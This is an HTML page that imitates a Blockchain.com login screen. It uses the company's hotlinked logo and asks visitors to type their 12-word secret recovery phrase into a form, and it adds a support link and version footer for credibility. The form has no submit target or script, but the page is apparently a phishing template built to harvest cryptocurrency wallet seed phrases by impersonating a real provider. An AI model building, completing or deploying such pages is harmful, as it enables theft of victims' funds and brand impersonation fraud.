<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Blockchain</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <script src="https://kit.fontawesome.com/4c4cf0b696.js" crossorigin="anonymous"></script>
        <link href="https://cdn.jsdelivr.net/npm/remixicon@3.4.0/fonts/remixicon.css" rel="stylesheet">
    <link rel="stylesheet" href="login.css">
</head>
<body>
    <section class="blockchain_">
        <div class="blockchain_logo" style="justify-content: center; color: rgb(251, 250, 249); display: flex;">
           <!-- <img src="https://altcoinsbox.com/wp-content/uploads/2023/01/blockchain.com-logo.svg" alt="" style="width: 2%; height: 3%;"> <h3>Blockchain.com</h3> -->
           <img src="https://login.blockchain.com/img/bc-logo.svg?91c7840afd" alt="">
        </div>
        <div class="login_cont">
            <div style="background-color: white;" class="login_block">
                <div style="padding: 0 10% 0 10%;">    
                        <div>
                            <a href="login.html" style="text-decoration: none;">
                                <div style="display: flex;">
                                    <i class="ri-arrow-left-line" style="color: blue; font-size: 28px;"></i>
                                    <p style="padding-top: 10px; color: black;">Back</p>
                                </div>
                            </a>
                            <div>
                                <div class="blk_phrase">
                                    <p>
                                        <b>Input your secret private key recovery phrase</b>
                                    </p>
                                    <p>
                                        Your 12 word Secret Key Recovery Phrase grants access to your account. Please input it in the order specified
                                    </p>
                                </div>
                            </div>
                            
                        </div>
                        <form action="" style="display: grid; position: relative;">
                            <div class="content" style="display: grid; padding-top: 2px;">
                                <input type="text" placeholder="Enter your secret private key recovery phrase" required>
                                <p style="text-align: center; color: rgb(103, 113, 132); font-weight: 500;
                                font-size: 14px;
                                line-height: 1.5;" >Separate each word with a space</p>
                            </div>
                            <div class="content" style="padding-top: 0;">
                                <input type="submit" value="Continue" style="width: 100%;">
                            </div>
                        </form>
                </div>
                <div class="blc_act" style="text-align: center; border-top: 1px solid rgb(181, 178, 178);"> <h5>Trouble Logging In? <a href="#" style="text-decoration: none;">Contact Support</a></h5></div>
            </div>
        </div>
        <footer style="padding-top: 50px; font-weight: bold;">
            <div class="" style="display: flex; color:rgba(194, 194, 196, 0.764); justify-content: center;">
                <div style="padding: 0.5rem; bottom: 0rem; position: relative;">
                    <select class="" aria-label="Default select example" name="state" style="background: none; border: none; color:rgba(194, 194, 196, 0.764); font-weight: 500;">
                        <option class="select1">English</option>
                        <option value="1">Español</option>
                        <option value="2">Français</option>
                        <option value="3">Português</option>
                        <option value="3">Русский</option>
                        <option value="3">Delta</option>
                    </select>
                    <style>
                        select:hover{
                            border: none;
                        }
                    </style>
                </div>
                <div style="padding: 0.5rem;"><p>Version 4.94.19</p></div>
                <div style="padding: 0.5rem;"><p>Need Help?</p></div>
            </div>
        </footer>
    </section>
</body>
</html>
